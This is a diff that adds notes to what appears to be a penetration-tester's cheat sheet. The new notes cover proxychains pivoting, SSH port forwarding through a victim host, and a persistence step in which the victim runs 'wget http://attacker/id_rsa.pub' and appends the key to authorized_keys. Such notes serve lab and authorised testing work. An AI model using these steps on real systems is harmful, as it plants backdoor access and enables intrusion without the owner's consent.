@@ -43,6 +43,45 @@ SQLmap
 
 manually specify number of union columns with `--union-cols=n`
 
+Proxy chains
+---
+```
+edit /etc/proxychains4.conf 
+
+examples:
+http <ip> <port>
+socks5 <victim service> <victim port> <user> <password>
+
+$ proxychains ssh user@<ip>
+```
+
+SSH port forwarding
+---
+
+append your pub key to `/home/user/.ssh/authorized_keys`
+
+On your attacker machine:
+
+`ssh -L <local port>:<victim service>:<victim port> <victim>@<ip>`
+
+OR using dynamic forwarding for attacks
+
+`ssh -D <local port> <victim>@<ip>`
+
+
+Adding your SSH to the victim
+---
+
+Append your public to the victim's ~/.ssh/authorized_keys
+```
+On attacker:
+ssh-keygen
+
+On victim:
+wget http://attacker/id_rsa.pub
+cat id_rsa.pub >> ~/.ssh/authorized_keys
+```
+
 Other stuff
 ---
 - Check SSL cert
